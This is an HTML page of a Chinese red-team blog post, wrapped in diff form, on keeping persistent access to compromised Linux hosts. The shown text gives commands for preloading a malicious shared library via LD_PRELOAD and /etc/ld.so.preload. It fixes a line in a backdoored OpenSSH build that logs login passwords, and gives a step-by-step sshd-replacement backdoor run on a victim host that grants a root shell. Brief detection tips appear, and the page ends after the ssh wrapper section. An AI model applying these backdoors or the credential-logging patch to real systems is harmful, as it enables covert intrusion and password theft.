@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/blogicon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blogicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blogicon.png">
+  <link rel="mask-icon" href="/images/blogicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mieea.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="Linux单机权限维持进程注入目前看来所有的进程注入都是指的以附加.so文件的形式注入。 原理:Linux Infecting Running Processes译文:linux进程注入 工具推荐:1.linux-inject使用ptrace向进程中注入恶意so文件使用示例:Linux权限维持之进程注入2.dlinject不使用ptrace向进程中注入恶意so文件 排查方式1.基于时间线索筛出so">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux单机权限维持">
+<meta property="og:url" content="https://mieea.github.io/posts/45846/index.html">
+<meta property="og:site_name" content="Mieea&#39;s blog">
+<meta property="og:description" content="Linux单机权限维持进程注入目前看来所有的进程注入都是指的以附加.so文件的形式注入。 原理:Linux Infecting Running Processes译文:linux进程注入 工具推荐:1.linux-inject使用ptrace向进程中注入恶意so文件使用示例:Linux权限维持之进程注入2.dlinject不使用ptrace向进程中注入恶意so文件 排查方式1.基于时间线索筛出so">
+<meta property="og:locale">
+<meta property="og:image" content="https://mieea.github.io/images/Linux%E7%BB%B4%E6%9D%83%E5%90%8E%E9%97%A8_functions.png">
+<meta property="article:published_time" content="2020-11-30T14:20:43.000Z">
+<meta property="article:modified_time" content="2020-11-30T14:27:53.866Z">
+<meta property="article:tag" content="redteam">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mieea.github.io/images/Linux%E7%BB%B4%E6%9D%83%E5%90%8E%E9%97%A8_functions.png">
+
+
+<link rel="canonical" href="https://mieea.github.io/posts/45846/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+<title>Linux单机权限维持 | Mieea's blog</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Mieea's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux%E5%8D%95%E6%9C%BA%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.</span> <span class="nav-text">Linux单机权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">进程注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5%E6%96%B9%E5%BC%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">排查方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%9E%8B%E6%81%B6%E6%84%8F%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="nav-number">1.2.</span> <span class="nav-text">Linux预加载型恶意动态链接库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.2.1.</span> <span class="nav-text">预备知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8LD-PRELOAD%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用LD_PRELOAD环境变量</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ld-so-preload%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.3.</span> <span class="nav-text">利用ld.so.preload配置文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-1"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%99%A8"><span class="nav-number">1.2.4.</span> <span class="nav-text">修改动态链接器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-2"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">排查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ESSH%E8%A1%8D%E7%94%9F%E5%90%8E%E9%97%A8"><span class="nav-number">1.3.</span> <span class="nav-text">基于SSH衍生后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#openssh%E6%BA%90%E7%A0%81%E5%8C%85%E6%9B%BF%E6%8D%A2%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="nav-number">1.3.1.</span> <span class="nav-text">openssh源码包替换后门文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CentOS"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">CentOS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ubuntu"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">Ubuntu</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-wrapper%E6%AD%A3%E5%90%91%E5%90%8E%E9%97%A8"><span class="nav-number">1.3.2.</span> <span class="nav-text">ssh wrapper正向后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CentOS7%E5%AE%9E%E8%B7%B5%E7%9A%84%E5%9D%91"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">CentOS7实践的坑</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.3.3.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5%E6%96%B9%E5%BC%8F-1"><span class="nav-number">1.3.4.</span> <span class="nav-text">排查方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PAM%E5%90%8E%E9%97%A8"><span class="nav-number">1.4.</span> <span class="nav-text">PAM后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#VIM%E5%90%8E%E9%97%A8"><span class="nav-number">1.5.</span> <span class="nav-text">VIM后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5%E6%96%B9%E5%BC%8F-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">排查方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stace%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8"><span class="nav-number">1.6.</span> <span class="nav-text">stace记录后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A9%E5%B1%95"><span class="nav-number">1.6.1.</span> <span class="nav-text">扩展</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-3"><span class="nav-number">1.6.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Esuid%E8%A1%8D%E7%94%9F%E5%90%8E%E9%97%A8"><span class="nav-number">1.7.</span> <span class="nav-text">基于suid衍生后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E5%90%8E%E9%97%A8%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.7.1.</span> <span class="nav-text">基础后门示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84crontab%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.8.</span> <span class="nav-text">常规crontab反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9%E7%A4%BA%E4%BE%8B1"><span class="nav-number">1.8.1.</span> <span class="nav-text">反弹示例1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9%E7%A4%BA%E4%BE%8B2"><span class="nav-number">1.8.2.</span> <span class="nav-text">反弹示例2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu%E5%8F%8D%E5%BC%B9%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-number">1.8.3.</span> <span class="nav-text">Ubuntu反弹注意事项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-4"><span class="nav-number">1.8.4.</span> <span class="nav-text">排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="nav-number">1.8.5.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8init-d"><span class="nav-number">1.9.</span> <span class="nav-text">开机启动init.d</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#functions"><span class="nav-number">1.9.1.</span> <span class="nav-text">functions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-5"><span class="nav-number">1.9.2.</span> <span class="nav-text">排查</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.10.</span> <span class="nav-text">环境变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD"><span class="nav-number">1.10.1.</span> <span class="nav-text">函数重载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BD%86%E5%AE%B9%E6%98%93%E8%A2%AB%E5%8F%91%E7%8E%B0%E7%B3%BB%E5%88%97"><span class="nav-number">1.11.</span> <span class="nav-text">简单但容易被发现系列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0root%E6%9D%83%E9%99%90%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7"><span class="nav-number">1.11.1.</span> <span class="nav-text">添加root权限后门用户</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Way1"><span class="nav-number">1.11.1.1.</span> <span class="nav-text">Way1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Way2"><span class="nav-number">1.11.1.2.</span> <span class="nav-text">Way2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E7%96%91%E7%94%A8%E6%88%B7%E6%8E%92%E6%9F%A5"><span class="nav-number">1.11.1.3.</span> <span class="nav-text">可疑用户排查</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E5%85%AC%E9%92%A5%E6%B7%BB%E5%8A%A0"><span class="nav-number">1.11.2.</span> <span class="nav-text">ssh公钥添加</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E8%BD%AF%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.11.3.</span> <span class="nav-text">ssh软连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E8%B7%B5%E7%9A%84%E5%9D%91%E7%82%B9"><span class="nav-number">1.11.3.1.</span> <span class="nav-text">实践的坑点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5-6"><span class="nav-number">1.11.3.2.</span> <span class="nav-text">排查</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83-2"><span class="nav-number">1.12.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://mieea.github.io/posts/45846/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mieea's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux单机权限维持
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2020-11-30 22:20:43 / Modified: 22:27:53" itemprop="dateCreated datePublished" datetime="2020-11-30T22:20:43+08:00">2020-11-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/websec/" itemprop="url" rel="index"><span itemprop="name">websec</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>12k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>29 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="Linux单机权限维持"><a href="#Linux单机权限维持" class="headerlink" title="Linux单机权限维持"></a>Linux单机权限维持</h1><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>目前看来所有的进程注入都是指的以附加<code>.so</code>文件的形式注入。</p>
+<p>原理:<a target="_blank" rel="noopener" href="https://0x00sec.org/t/linux-infecting-running-processes/1097">Linux Infecting Running Processes</a><br>译文:<a target="_blank" rel="noopener" href="https://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">linux进程注入</a></p>
+<p>工具推荐:<br>1.<a target="_blank" rel="noopener" href="https://github.com/gaffe23/linux-inject/">linux-inject</a><br>使用ptrace向进程中注入恶意so文件<br>使用示例:<a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-01-01/2">Linux权限维持之进程注入</a><br>2.<a target="_blank" rel="noopener" href="https://github.com/DavidBuchanan314/dlinject">dlinject</a><br>不使用ptrace向进程中注入恶意so文件</p>
+<h3 id="排查方式"><a href="#排查方式" class="headerlink" title="排查方式"></a>排查方式</h3><p>1.基于时间线索筛出so文件<br>2.遍历进程，获取so观察时间</p>
+<a id="more"></a>
+<h2 id="Linux预加载型恶意动态链接库"><a href="#Linux预加载型恶意动态链接库" class="headerlink" title="Linux预加载型恶意动态链接库"></a>Linux预加载型恶意动态链接库</h2><h3 id="预备知识点"><a href="#预备知识点" class="headerlink" title="预备知识点"></a>预备知识点</h3><p>1.linux动态链接库预加载机制：<br>在linux操作系统的动态链接库加载过程中，动态链接器会读取<code>LD_PRELOAD</code>环境变量的值和默认配置文件<code>/etc/ld.so.preload</code>的文件内容，并将读取到的动态链接库进行预加载。即使程序不依赖这些动态链接库，<code>LD_PRELOAD</code>环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载，它们的优先级比<code>LD_LIBRARY_PATH</code>环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
+<p>2.全局符号介入<br>全局符号介入指的是应用程序调用库函数时，调用的库函数如果在多个动态链接库中都存在(存在同名函数)，那么链接器只会保留第一个链接的函数，而忽略后面链接进来的函数。所以只要预加载的全局符号中有和后加载的普通共享库中全局符号重名，那么就会覆盖后装载的共享库以及目标文件里的全局符号。</p>
+<h3 id="利用LD-PRELOAD环境变量"><a href="#利用LD-PRELOAD环境变量" class="headerlink" title="利用LD_PRELOAD环境变量"></a>利用LD_PRELOAD环境变量</h3><p>LD_PRELOAD环境变量是会及时生效的，加载恶意动态链接库方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;&#x2F;lib&#x2F;evil.so # LD_PRELOAD的值设置为要预加载的动态链接库</span><br><span class="line">export LD_PRELOAD # 导出环境变量使该环境变量生效</span><br></pre></td></tr></table></figure>
+<p>（导出后应该就会被隐藏，没试也不知道为什么</p>
+<h4 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $LD_PRELOAD # 查看是否加载了库以及是否恶意</span><br><span class="line">unset LD_PRELOAD # 解除设置的LD_PRELOAD环境变量</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用ld-so-preload配置文件"><a href="#利用ld-so-preload配置文件" class="headerlink" title="利用ld.so.preload配置文件"></a>利用ld.so.preload配置文件</h3><p>将恶意动态链接库路径写入<code>/etc/ld.so.preload</code>(没有则创建)配置文件中即生效，对应的恶意动态链接库文件被隐藏。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#x2F;lib&#x2F;evil.so&quot; &gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure>
+
+<h4 id="排查-1"><a href="#排查-1" class="headerlink" title="排查"></a>排查</h4><p>因为恶意动态链接库一般都有隐藏<code>/etc/ld.so.preload</code>文件的功能，使用普通的<code>ls</code>、<code>cat</code>等命令无法读取对应配置文件的内容，此时我们可以使用静态编译的<code>ls</code>命令、<code>cat</code>命令（推荐使用busybox自带命令)来绕过预加载的恶意动态链接库。</p>
+<p>清除顺序:<br>(a)<code>/etc/ld.so.preload</code>文件中查看到的<code>/lib/evil.so</code>文件<br>(b)<code>/etc/ld.so.preload</code>文件中的内容</p>
+<p>排查案例参考:<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/31e487daa79d">记一次CPU占用过半，进程被隐藏的木马</a><br><a target="_blank" rel="noopener" href="https://www.fooying.com/linux-hide-process-miner-analysis/">Linux 遭入侵，挖矿进程被隐藏案例分析</a></p>
+<h3 id="修改动态链接器"><a href="#修改动态链接器" class="headerlink" title="修改动态链接器"></a>修改动态链接器</h3><p>通过修改动态链接器中配置文件路径<code>/etc/ld.so.preload</code>为自定义的路径来实现更加隐蔽的恶意动态链接库预加载。<br>rootkit示例:<a target="_blank" rel="noopener" href="https://github.com/mempodippy/vlany">Vlany</a></p>
+<h4 id="排查-2"><a href="#排查-2" class="headerlink" title="排查"></a>排查</h4><p>使用文件完整性检查来检查该动态链接器是否被修改。</p>
+<h2 id="基于SSH衍生后门"><a href="#基于SSH衍生后门" class="headerlink" title="基于SSH衍生后门"></a>基于SSH衍生后门</h2><p>用的似乎不多，因为公网开ssh的不多。</p>
+<h3 id="openssh源码包替换后门文件"><a href="#openssh源码包替换后门文件" class="headerlink" title="openssh源码包替换后门文件"></a>openssh源码包替换后门文件</h3><h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><p>实践参考:<br>1.<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aixixxx/article/details/104399536">OpenSSH万能后门</a><br>2.<a target="_blank" rel="noopener" href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/">OpenSSH源码下载地址</a></p>
+<p>实践的过程发现编译出错，看了一下代码发现是博主原文写错:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auth-passwd.c:88:57: 错误：‘Authctxt’没有名为‘server_user’的成员</span><br><span class="line">   fprintf(f,&quot;user:password@host --&gt; %s:%s@%s\n&quot;,authctxt-&gt;server_user,password,authctxt-&gt;host);</span><br><span class="line">auth-passwd.c:88:88: 错误：‘Authctxt’没有名为‘host’的成员</span><br><span class="line">   fprintf(f,&quot;user:password@host --&gt; %s:%s@%s\n&quot;,authctxt-&gt;server_user,password,authctxt-&gt;host);</span><br></pre></td></tr></table></figure>
+<p>改成如下即可:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fprintf(f,&quot;username: %s password: %s&quot;, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure>
+
+<p>Centos SSH日志位置:<code>/var/log/secure</code></p>
+<h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><p>别问…问就是搞了两小时环境都没搞对….</p>
+<h3 id="ssh-wrapper正向后门"><a href="#ssh-wrapper正向后门" class="headerlink" title="ssh wrapper正向后门"></a>ssh wrapper正向后门</h3><p>可以理解为另写了一个带ssh功能的程序代替了<code>/usr/sbin/sshd</code></p>
+<p>受害主机上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cd &#x2F;usr&#x2F;sbin</span><br><span class="line">[root@localhost sbin]# mv sshd ..&#x2F;bin</span><br><span class="line">[root@localhost sbin]# echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">[root@localhost sbin]# echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">[root@localhost sbin]# echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">[root@localhost sbin]# chmod +x sshd</span><br><span class="line">[root@localhost sbin]# service sshd restart</span><br></pre></td></tr></table></figure>
